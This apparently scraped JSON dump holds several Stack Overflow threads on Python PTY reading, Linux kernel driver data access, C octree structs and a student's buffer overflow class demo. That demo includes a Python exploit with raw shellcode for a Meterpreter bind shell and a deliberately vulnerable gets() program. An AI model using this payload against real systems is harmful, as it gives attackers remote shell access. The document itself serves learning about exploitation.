in order to take advantage of non-blocking mode; randomly trying at some interval is really not a very good approach."}, {"owner": {"reputation": 7687, "user_id": 3220983, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/ypq01.jpg?s=128&g=1", "display_name": "BuvinJ", "link": "https://stackoverflow.com/users/3220983/buvinj"}, "edited": false, "score": 0, "creation_date": 1542240260, "post_id": 53310273, "comment_id": 93501986, "body": "Thanks @rici.  That&#39;s much appreciated.  I&#39;ll take that under advisement. None of the code posted here is actual production code. This is pure proof of concept. The producer end will be cleaned up and put into a more comprehensive Python library.  The real consumer end will be C++.  The goal is to emulate a device driver. The real thing (where the driver will be) is on an embedded device, the emulations will run in Linux and Windows desktops. So, this is a rough draft of an emulation, on one platform. And the driver will not work via interrupts but will be reading a continuous analog stream"}], "tags": [], "owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "is_accepted": false, "score": 2, "last_activity_date": 1542237882, "creation_date": 1542237882, "answer_id": 53310273, "question_id": 53305231, "link": "https://stackoverflow.com/questions/53305231/cant-read-pty-pseudo-terminal-file-from-external-process/53310273#53310273", "title": "Can&#39;t read PTY (pseudo terminal file) from external process", "body": "<p>What makes you think you cannot open the PTY? Nothing in your code provides information about which system call failed.</p>\n\n<p>The most likely thing is that the <code>os.read()</code> call fails with error code <code>EAGAIN</code> (aka <code>EWOULDBLOCK</code>) because you have opened the PTY in non-blocking mode. There's no data to read because a PTY is a tty, and ttys are initially in \"cooked\" mode, which means that no input is passed to the consumer until either an end of line character or some interrupt character is sent. Minicom probably puts the pty into \"raw\" mode with a termios call, and you should do that, too.</p>\n\n<p>I would guess that you don't really want to put the PTY into non-blocking mode. Unless you set up event polling or a select loop, you're going to repeatedly get <code>EAGAIN</code> \"errors\" (which are not really errors) and you really don't want to wait a full second before you try again. (Nor do you really want to close and reopen the PTY.) You would be better advised to leave the PTY in blocking mode but configure it to return immediately on each keystroke (again, with <code>termios</code>).</p>\n"}, {"tags": [], "owner": {"reputation": 7687, "user_id": 3220983, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/ypq01.jpg?s=128&g=1", "display_name": "BuvinJ", "link": "https://stackoverflow.com/users/3220983/buvinj"}, "is_accepted": false, "score": 1, "last_activity_date": 1542240350, "last_edit_date": 1542240350, "creation_date": 1542239517, "answer_id": 53310504, "question_id": 53305231, "link": "https://stackoverflow.com/questions/53305231/cant-read-pty-pseudo-terminal-file-from-external-process/53310504#53310504", "title": "Can&#39;t read PTY (pseudo terminal file) from external process", "body": "<p>My primary hangup was in the pty settings.  See my comment under @rici's answer.</p>\n\n<p>Revised producer.py:</p>\n\n<pre><code>import os, sys\nfrom time import sleep\nimport fcntl\nimport termios \n\n# create a new Psdeuo Terminal (pty), with a dynamically \n# assigned path to it, and display the minicom command to \n# open it as a test consumer\nmaster_fd, slave_fd = os.openpty()\nprint \"minicom -D %s\" % os.ttyname( slave_fd )\n\n# termios attribute index constants\niflag  = 0\noflag  = 1\ncflag  = 2\nlflag  = 3\nispeed = 4\nospeed = 5\ncc     = 6\n# get current pty attributes\ntermAttr = termios.tcgetattr( master_fd )\n# disable canonical and echo modes       \ntermAttr[lflag] &amp;= ~termios.ICANON &amp; ~termios.ECHO\n# disable interrupt, quit, and suspend character processing \ntermAttr[cc][termios.VINTR] = '\\x00' \ntermAttr[cc][termios.VQUIT] = '\\x00'\ntermAttr[cc][termios.VSUSP] = '\\x00'\n# set revised pty attributes immeaditely\ntermios.tcsetattr( master_fd, termios.TCSANOW, termAttr )\n\n# enable non-blocking mode on the file descriptor\nflags = fcntl.fcntl( master_fd, fcntl.F_GETFL ) \nflags |= os.O_NONBLOCK               \nfcntl.fcntl( master_fd, fcntl.F_SETFL, flags )\n\n# write some example data for a couple of minutes\nfor i in range(0,60): \n    d = str(i % 10)\n    os.write( master_fd, d )\n    sys.stdout.write( d )\n    sys.stdout.flush()\n    sleep( 2 )\n\n# release the resources     \nos.close( slave_fd )\nos.close( master_fd )\nprint \"\\nDone\"\n</code></pre>\n\n<p>Revised consumer.py:</p>\n\n<pre><code>import os, sys\nfrom time import sleep\nfrom errno import EAGAIN, EBUSY\n\nERRORS_TO_IGNORE = [EAGAIN, EBUSY]\n\n# the PTS will be dynamically assigned to the producer,\n# so the consumer needs to have that supplied\npts=raw_input(\"Enter pts number:\")\n\nfd=None\nprint \"Press Ctrl+Z to exit\"\nwhile True:\n    sleep(1)      \n    # if the pty is not open, attempt to open it\n    # in readonly, non-blocking mode\n    try:\n        if not fd:\n            fd=os.open('/dev/pts/%s' % (pts,), \n                       os.O_RDONLY | os.O_NONBLOCK )\n    except Exception as e:\n        print e\n        if fd: fd = os.close(fd)     \n        continue         \n    # attempt to read/pop a character from the stream\n    # and then display it in this terminal                 \n    try:        \n        c = os.read( fd, 1 )\n        sys.stdout.write( str(c) )  \n        sys.stdout.flush()\n    except Exception as e:\n        # ignore some \"normal\" / \"race condition\" errors\n        if( isinstance(e, OSError) and\n            e.errno in ERRORS_TO_IGNORE ):pass\n        else : print e\n</code></pre>\n"}], "owner": {"reputation": 7687, "user_id": 3220983, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/ypq01.jpg?s=128&g=1", "display_name": "BuvinJ", "link": "https://stackoverflow.com/users/3220983/buvinj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 591, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1542240655, "creation_date": 1542214628, "last_edit_date": 1542240655, "question_id": 53305231, "link": "https://stackoverflow.com/questions/53305231/cant-read-pty-pseudo-terminal-file-from-external-process", "title": "Can&#39;t read PTY (pseudo terminal file) from external process", "body": "<p>I am opening a PTY (in Python/Linux) and writing to it.  I can read from it via <code>minicom</code> perfectly.  But, I can't read from it in another Python (or C++) program.  Here is a minimized example:</p>\n\n<p>producer.py (opens pty / writes to it):</p>\n\n<pre><code>import os, sys\nfrom time import sleep\nmaster_fd, slave_fd = os.openpty()\nprint \"minicom -D %s\" % os.ttyname( slave_fd )\nfor i in range(0,30): \n    d = str(i % 10)\n    os.write( master_fd, d )\n    sys.stdout.write( d )\n    sys.stdout.flush()\n    sleep( 2 )\nos.close( slave_fd )\nos.close( master_fd )\nprint \"\\nDone\"    \n</code></pre>\n\n<p>consumer.py (tries to open/read):</p>\n\n<pre><code>import os, sys\nfrom time import sleep\npts=raw_input(\"Enter pts number:\")\nwhile True:\n    fd=0\n    try:\n        fd=os.open('/dev/pts/%d' % (pts,), \n            os.O_RDONLY | os.O_NONBLOCK )\n        sys.stdout.write( os.read(fd, 1 ) )  \n        sys.stdout.flush()       \n    except Exception as e: print e\n    if fd: os.close(fd)    \n    sleep(1)        \n</code></pre>\n\n<p>The result of the read is always:</p>\n\n<blockquote>\n  <p>[Errno 11] Resource temporarily unavailable</p>\n</blockquote>\n\n<p>If I read in blocking mode, it just blocks until the producer terminates.  Then, it says the file doesn't exist.</p>\n\n<p>I have spent days fiddling with trying to set various modes, permissions, locks, etc.  and nothing seems to get me anywhere.  This sort of thing works fine with regular files easily.  Also, note again that <strong>minicom can read the pty</strong> without a hitch.  Further, using <code>lsof</code> I can see that both minicom and my consumer.py script indeed open the file - it is just the read that doesn't work in the python example. So what's the minicom secret? I tried finding such in the minicom source code, but I did not succeed in finding anything I could use.  </p>\n\n<p>Ideally, my producer would make it easy to open and read (like in my consumer example), but if I can see this work, I'm open to modifying either end...</p>\n"}, {"tags": ["c", "linux-kernel", "linux-device-driver", "kernel-module", "device-driver"], "comments": [{"owner": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1542235703, "post_id": 53304899, "comment_id": 93500598, "body": "Search in Device Tree, how to add devices there. What you are trying to do is completely wrong."}, {"owner": {"reputation": 326, "user_id": 8157105, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/A1A9a.jpg?s=128&g=1", "display_name": "Alex Hoffmann", "link": "https://stackoverflow.com/users/8157105/alex-hoffmann"}, "reply_to_user": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1542269253, "post_id": 53304899, "comment_id": 93509909, "body": "@0andriy but I don&#39;t need to add a device. Simply access device information from existing and initialized devices"}, {"owner": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1542272238, "post_id": 53304899, "comment_id": 93511389, "body": "What kind if information do you need?"}, {"owner": {"reputation": 326, "user_id": 8157105, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/A1A9a.jpg?s=128&g=1", "display_name": "Alex Hoffmann", "link": "https://stackoverflow.com/users/8157105/alex-hoffmann"}, "reply_to_user": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1542293839, "post_id": 53304899, "comment_id": 93524482, "body": "@0andriy in the client data (client-&gt;dev-&gt;p-&gt;driver_data) the registers of the device are stored, updated when ina2xx_update_device is called. This private data is what I need to get access to."}, {"owner": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1542316935, "post_id": 53304899, "comment_id": 93536475, "body": "Why do you need them?"}, {"owner": {"reputation": 326, "user_id": 8157105, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/A1A9a.jpg?s=128&g=1", "display_name": "Alex Hoffmann", "link": "https://stackoverflow.com/users/8157105/alex-hoffmann"}, "reply_to_user": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1542358711, "post_id": 53304899, "comment_id": 93548045, "body": "@oandriy they contain the power usage value for the CPU and I do CPU governor reserach"}], "answers": [{"comments": [{"owner": {"reputation": 326, "user_id": 8157105, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/A1A9a.jpg?s=128&g=1", "display_name": "Alex Hoffmann", "link": "https://stackoverflow.com/users/8157105/alex-hoffmann"}, "edited": false, "score": 0, "creation_date": 1542979571, "post_id": 53430587, "comment_id": 93767930, "body": "Had a conversation with a colleague moments before reading this and his advice was exactly the same. Thank you!!"}], "tags": [], "owner": {"reputation": 1879, "user_id": 1586929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f75b3597330a3d6854efc6f1578fc595?s=128&d=identicon&r=PG", "display_name": "Krzysztof Adamski", "link": "https://stackoverflow.com/users/1586929/krzysztof-adamski"}, "is_accepted": true, "score": 2, "last_activity_date": 1542888120, "creation_date": 1542888120, "answer_id": 53430587, "question_id": 53304899, "link": "https://stackoverflow.com/questions/53304899/how-to-access-driver-information-from-within-the-kernel/53430587#53430587", "title": "How to access driver information from within the kernel?", "body": "<p>The ina231 sensor on your board is most likely instantiated from DeviceTree. If that is the case, and your driver is also instantiated from DT, then it would be natural to store a phandle to ina231 sensor as a property in your DT node. Then you can use <code>of_find_node_by_phandle()</code> to get a <code>struct device_node</code> and then use <code>of_find_i2c_device_by_node</code> to turn it into <code>struct i2c_client</code>.</p>\n\n<p>An alternative approach would be to use <code>bus_find_device()</code> with <code>&amp;i2c_bus_type</code> as a first argument and using your custom <code>match function</code>. See the <code>of_find_i2c_device_by_node</code> implementation as an example on how this could be used.</p>\n\n<p>Note that none of that will be pretty since you are planning on using driver private internal data which itself isn't a nice practice.</p>\n"}], "owner": {"reputation": 326, "user_id": 8157105, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/A1A9a.jpg?s=128&g=1", "display_name": "Alex Hoffmann", "link": "https://stackoverflow.com/users/8157105/alex-hoffmann"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 630, "favorite_count": 0, "accepted_answer_id": 53430587, "answer_count": 1, "score": 1, "last_activity_date": 1542888120, "creation_date": 1542213429, "question_id": 53304899, "link": "https://stackoverflow.com/questions/53304899/how-to-access-driver-information-from-within-the-kernel", "title": "How to access driver information from within the kernel?", "body": "<p>I work with cpu management in big.LITTLE boards and the board on which I am developing on has some ina231 power sensors. Which I believe are handled by the ina2xx_driver (this would make sense to me). My knowledge of drivers is still in development so I am unsure about how I should get the information I need to my CPU module out of the driver/devices, in a way that wont make the Linux gods angry.</p>\n\n<p>The board has 4 sensors which I believe are then stored in the <code>struct i2c_driver</code> in the linked list <code>struct list_head clients</code>. If I have understood this correctly, then my initial idea was to export a pointer to the driver</p>\n\n<pre><code>   static struct i2c_driver ina2xx_driver = { \n       .driver = { \n           .name   = \"ina2xx\",\n       },  \n       .probe      = ina2xx_probe,\n       .remove     = ina2xx_remove,\n       .id_table   = ina2xx_id,\n   };\n\n   +struct i2c_driver *ina2xx_driver_p = &amp;ina2xx_driver;\n\n   +EXPORT_SYMBOL(ina2xx_driver_p);\n</code></pre>\n\n<p>to my module which could then step through the linked list of i2c clients allowing me to access individual device information by doing something like this</p>\n\n<pre><code>struct i2c_client *tmp\nstruct list_head *pos;\nstruct list_head *clients_head = &amp;ina2xx_driver_p-&gt;clients; \n\nlist_for_each(pos, clients_head){\n    tmp = list_entry(pos, struct i2c_client, detected)\n    struct ina2xx_data *data = ina2xx_update_device(tmp.dev);\n    ina2xx_get_value(data, $(attribute));\n}\n</code></pre>\n\n<p>I haven't actually tried this, it's just how I imagine one solution being after reading the header files. Given my lack of knowledge on the recommended practice I thought it would be best to ask before wasting a day or two trying to implement something that is destined to fail.</p>\n\n<p>Is there a more standardized way that is used in the kernel to get device driver or device pointers to access information or way to get device information without reading it from files?</p>\n\n<p>I hope my question makes sense and thanks.</p>\n"}, {"tags": ["c", "reverse-engineering", "buffer-overflow", "metasploit"], "answers": [{"tags": [], "owner": {"reputation": 45, "user_id": 3725519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1b735fb111d7af9bc39d7b79c88eec1e?s=128&d=identicon&r=PG&f=1", "display_name": "user3725519", "link": "https://stackoverflow.com/users/3725519/user3725519"}, "is_accepted": false, "score": 0, "last_activity_date": 1542495915, "creation_date": 1542495915, "answer_id": 53356388, "question_id": 53304887, "link": "https://stackoverflow.com/questions/53304887/buffer-overflow-on-sample-c-program/53356388#53356388", "title": "Buffer Overflow on Sample C Program", "body": "<p>You didnt describe how you found the return address on the stack and why did you add the 'add esp' so I will just help you get it from the beginning and hope it will help you.</p>\n\n<p>First of all you should run the program in a debugger (I recommend IDA Pro) and start fuzzing it to see where the return address is stored on the stack.</p>\n\n<p>After that try not to use some shellcodes and try to run the root function from the code so if it will work you will be indicated with the output string. The buffer should look like this: \"A * return_address_offset + root_address\" if it will work you can use a simple shellcode instead of the root function by placing it on the buffer and overwriting the return address with 'jmp esp' so the shellcode that placed on the stack will run. if you wont jump to the shellcode on the stack the program will treat the first 4 bytes of the shellcode like an address and try to go there and most likely that address will be an invalid address so the program crashes.</p>\n\n<p>If you dont understand how it all work you should read about the stack and the calling conventions and how the program calls and returns from function.</p>\n\n<p>There is a <a href=\"https://www.fuzzysecurity.com/tutorials/expDev/1.html\" rel=\"nofollow noreferrer\">tutorial</a> about exploitation it should also help you.</p>\n\n<p>Hope I helped you!</p>\n"}], "owner": {"reputation": 19, "user_id": 10653042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97e4c114a76beeec96029151a8af8b21?s=128&d=identicon&r=PG&f=1", "display_name": "NoPurposeInLife", "link": "https://stackoverflow.com/users/10653042/nopurposeinlife"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 380, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1542495915, "creation_date": 1542213389, "last_edit_date": 1542246836, "question_id": 53304887, "link": "https://stackoverflow.com/questions/53304887/buffer-overflow-on-sample-c-program", "title": "Buffer Overflow on Sample C Program", "body": "<p>May I know how to increase the length of ESP on a sample c program which allows me to execute shellcode on the stack. However, as of now, the sample c program only has an ESP length of 61 thus insufficient for the shellcode. Any help is appreciated! This is for a class demonstration for beginners, i'm also a student so i'm very new to buffer overflow.</p>\n\n<p><strong>Sample C Program</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#pragma warning(disable: 4996)\n\nint root(void)\n{\n\n    printf(\"\\n Root privileges given to the user \\n\");\n    return 0;\n}\n\nint user(void){\n\n    printf(\"\\n Normal user privileges given to the user \\n\");\n    return 0;\n}\n\n\nint main(void)\n{\n    char buff[15];\n    int pass = 0;\n    int max = 15;\n\n\n    printf(\"\\n Enter the password : \\n\");\n    //fgets(buff, max, stdin);\n    gets(buff);\n\n    if (strcmp(buff, \"thegeekstuff\"))\n    {\n        printf(\"\\n Wrong Password \\n\");\n    }\n    else\n    {\n        printf(\"\\n Correct Password \\n\");\n        pass = 1;\n    }\n\n    if (pass == 1)\n    {\n        root();\n    } else {\n        user();\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Python Code for Exploit (Win86) - bind_tcp_staged_meterpreter [LPORT=4444]</p>\n\n<p>*Note: added an instruction for (add esp, -1500) before bind shell payload</p>\n\n<pre><code>#! python\n\nimport os\nimport sys\nimport subprocess\nimport binascii\nimport time\n\nESP_Address = bytes.fromhex('5954C377')\n\nbuf =  \"\"\n# Add ESP, -1500\nbuf += \"\\x81\\xC4\\x24\\xFA\\xFF\\xFF\"\n# Bind Meterpreter Shell\nbuf += \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\"\nbuf += \"\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\"\nbuf += \"\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\"\nbuf += \"\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\"\nbuf += \"\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\"\nbuf += \"\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\"\nbuf += \"\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\"\nbuf += \"\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\"\nbuf += \"\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\"\nbuf += \"\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\"\nbuf += \"\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\"\nbuf += \"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\"\nbuf += \"\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\"\nbuf += \"\\xff\\xd5\\x6a\\x0b\\x59\\x50\\xe2\\xfd\\x6a\\x01\\x6a\\x02\\x68\"\nbuf += \"\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x68\\x02\\x00\\x11\\x5c\\x89\"\nbuf += \"\\xe6\\x6a\\x10\\x56\\x57\\x68\\xc2\\xdb\\x37\\x67\\xff\\xd5\\x57\"\nbuf += \"\\x68\\xb7\\xe9\\x38\\xff\\xff\\xd5\\x57\\x68\\x74\\xec\\x3b\\xe1\"\nbuf += \"\\xff\\xd5\\x57\\x97\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x6a\\x00\"\nbuf += \"\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x8b\\x36\"\nbuf += \"\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\"\nbuf += \"\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68\\x02\"\nbuf += \"\\xd9\\xc8\\x5f\\xff\\xd5\\x01\\xc3\\x29\\xc6\\x75\\xee\\xc3\"\n\n\nbind_staged_shell_payload = bytes(buf, \"utf-8\")\nDummy_Data = (\"A\" * 35).encode()\n\nfinal_payload = Dummy_Data + ESP_Address + bind_staged_shell_payload\n\np = subprocess.Popen('buffer_overflow.exe', stdin=subprocess.PIPE) #NOTE: no shell=True here\ntime.sleep(20)\np.stdin.write(final_payload)\np.communicate()[0]\np.stdin.close()\n\nsys.exit(0)\n</code></pre>\n\n<p>Code used to compile c program in windows XP SP 1</p>\n\n<pre><code>gcc -Wl,--stack,4194304 -fno-stack-protector -m32 buffer_overflow.c -o buffer_overflow.exe\n</code></pre>\n\n<p>What I've tried....very embarrassing with no success:</p>\n\n<ol>\n<li><p>Compile C Program with the  <code>-Wl,--stack,4194304</code> option</p></li>\n<li><p>Tried to increase stack size by creating dummy variables with huge buffers (Apparently, it makes the length of ESP shorter...)</p></li>\n<li><p>Running cmd as Administrator...</p></li>\n<li><p>Turning off Firewall</p></li>\n<li><p>Testing Connectivity with nc IP_ADDRESS 4444 but connection refused (bind shell not generated successfully from exploit code) - will use meterpreter handler once connectivity has successfully established for the staged payload</p></li>\n</ol>\n\n<p><strong>Notes</strong></p>\n\n<p>The program does not crash with the shellcode as input...However, if a string with 100 characters is inserted, the program crashes.</p>\n"}, {"tags": ["c", "void-pointers", "octree"], "answers": [{"comments": [{"owner": {"reputation": 107, "user_id": 6889540, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-Sw5Zyp10bTw/AAAAAAAAAAI/AAAAAAAAAsU/xNx4SGdExW4/photo.jpg?sz=128", "display_name": "Lightningstorms", "link": "https://stackoverflow.com/users/6889540/lightningstorms"}, "edited": false, "score": 0, "creation_date": 1542220373, "post_id": 53305020, "comment_id": 93494033, "body": "Thanks for the reply! After thinking it through I think this might be the most consistent. Sneakily I had hoped there would be an even cleaner way, but I think this is already pretty clean in its own way."}], "tags": [], "owner": {"reputation": 5181, "user_id": 5529197, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6af647bacfb3f0b596c73b0e3b0dc4b1?s=128&d=identicon&r=PG&f=1", "display_name": "Afshin", "link": "https://stackoverflow.com/users/5529197/afshin"}, "is_accepted": true, "score": 5, "last_activity_date": 1542215017, "last_edit_date": 1542215017, "creation_date": 1542213845, "answer_id": 53305020, "question_id": 53304811, "link": "https://stackoverflow.com/questions/53304811/access-type-flag-of-unknown-void-pointer-based-on-two-possible-structs/53305020#53305020", "title": "Access type flag of unknown void pointer based on two possible structs?", "body": "<p>This a method that is used commonly in <code>C</code>. </p>\n\n<p>But just put these field at <strong>start</strong> of structure (first field) and never change their position. In addition, you need to keep them in all your structures.</p>\n\n<p>A common sample for this approach is the <code>version</code> field in structures (or <code>type</code> in your case). You can keep them at start of structure, and then check structure version by similar method. something like this:</p>\n\n<pre><code>struct _base {\n    uint8_t ver;\n};\n\n#define TYPE_OLD 0\nstruct _a_old {\n    struct _base info;\n    uint8_t a;\n};\n\n#define TYPE_NEW 1\nstruct _a_new {\n    struct _base info;\n    uint8_t a;\n    uint8_t b;\n};\n</code></pre>\n\n<p>Now you can identify different types by casting your data to <code>struct _base</code> and checking <code>ver</code> field.</p>\n\n<pre><code>unsigned char* buf = ...\nswitch (((struct _base*)buf)-&gt;ver)\n{\n    case TYPE_OLD:\n    {\n        struct _a_old* old = (struct _a_old*)buf;\n        // ...\n        break;\n    }\n    case TYPE_NEW:\n    {\n        struct _a_new* old = (struct _a_new*)buf;\n        // ...\n        break;\n    }\n    default:\n        // ...\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 107, "user_id": 6889540, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-Sw5Zyp10bTw/AAAAAAAAAAI/AAAAAAAAAsU/xNx4SGdExW4/photo.jpg?sz=128", "display_name": "Lightningstorms", "link": "https://stackoverflow.com/users/6889540/lightningstorms"}, "edited": false, "score": 0, "creation_date": 1542220122, "post_id": 53305129, "comment_id": 93493927, "body": "Thanks for the reply! Together with the reference, I can get a good understanding. After seeing the other example, I do think it might be better practice to use a struct as the base with the node type and the location_code. This way I can guarantee equal naming and avoid repetition."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 3, "last_activity_date": 1542214526, "last_edit_date": 1542214526, "creation_date": 1542214225, "answer_id": 53305129, "question_id": 53304811, "link": "https://stackoverflow.com/questions/53304811/access-type-flag-of-unknown-void-pointer-based-on-two-possible-structs/53305129#53305129", "title": "Access type flag of unknown void pointer based on two possible structs?", "body": "<p>This will work, assuming the <code>type</code> field is first in each struct.  A pointer to a struct may safely be converted to a pointer to its first member, so assuming your structs look like this:</p>\n\n<pre><code>typedef struct _OctreeInnerNode\n{\n    uint8_t type;    // type goes first\n    uint8_t child_exists;   // put uint8_t members together to keep size down\n    uint64_t location_code;\n} OctreeInnerNode;\n\ntypedef struct _OctreeLeafNode\n{\n    uint8_t type;   // type goes first\n    uint64_t object_index;\n    uint64_t location_code;\n} OctreeLeafNode;\n</code></pre>\n\n<p>You can cast either a <code>OctreeInnerNode *</code> or a <code>OctreeLeafNode *</code> to a <code>uint8_t *</code>.  Then this is possible:</p>\n\n<pre><code>void func(void* node) {\n    uint8_t type = *(uint8_t*)node;\n    if (type == LEAF_NODE) {\n        OctreeLeafNode *leafNode = node;\n        ...\n    } else if (type == INNER_NODE) {\n        OctreeInnerNode *innerNode = node;\n        ...\n    }\n}\n\n...\n\nOctreeLeafNode leaf = { LEAF_NODE, 2, 3 };\nOctreeInnerNode inner = { INNER_NODE, 5, 1 };\n\nfunc(&amp;leaf);\nfunc(&amp;inner);\n</code></pre>\n\n<p>This is guaranteed as per section 6.7.2.1p15 of the <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">C standard</a>:</p>\n\n<blockquote>\n  <p>Within  a  structure  object,  the  non-bit-field  members  and  the \n  units  in  which  bit-fields reside have addresses that increase in\n  the order in which they are declared.  <strong>A pointer to a structure \n  object,  suitably  converted,  points  to  its  initial  member</strong>  (or \n  if  that  member  is  a bit-field,  then  to  the  unit  in  which  it\n  resides),  and  vice  versa.   There  may  be  unnamed padding within\n  a structure object, but not at its beginning</p>\n</blockquote>\n"}], "owner": {"reputation": 107, "user_id": 6889540, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-Sw5Zyp10bTw/AAAAAAAAAAI/AAAAAAAAAsU/xNx4SGdExW4/photo.jpg?sz=128", "display_name": "Lightningstorms", "link": "https://stackoverflow.com/users/6889540/lightningstorms"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 102, "favorite_count": 1, "accepted_answer_id": 53305020, "answer_count": 2, "score": 6, "last_activity_date": 1542215017, "creation_date": 1542213139, "last_edit_date": 1542214298, "question_id": 53304811, "link": "https://stackoverflow.com/questions/53304811/access-type-flag-of-unknown-void-pointer-based-on-two-possible-structs", "title": "Access type flag of unknown void pointer based on two possible structs?", "body": "<p>I am currently working on my own octree in C. The tree will contain a few billion objects, so memory efficiency is key. To achieve this I currently use one struct with a flag and a union, but I think it is not clean and it is wasting space for the inner node because I only need an 8-bit flag but memory is being reserved for the 64-bit index. My code currently is as follows:</p>\n\n<pre><code>typedef struct _OctreeNode\n{\n    uint64_t location_code;\n    union\n    {\n        uint8_t child_exists;\n        uint64_t object_index;\n    } data;\n    uint8_t type;\n} OctreeNode;\n</code></pre>\n\n<p>I would like to split this up into two different structs. One leaf node and one inner node. As follows:</p>\n\n<pre><code>typedef struct _OctreeInnerNode\n{\n    uint64_t location_code;\n    uint8_t child_exists;\n    uint8_t type;\n} OctreeInnerNode;\n\ntypedef struct _OctreeLeafNode\n{\n    uint64_t location_code;\n    uint64_t object_index;\n    uint8_t type;\n} OctreeLeafNode;\n</code></pre>\n\n<p>Now the problem arises 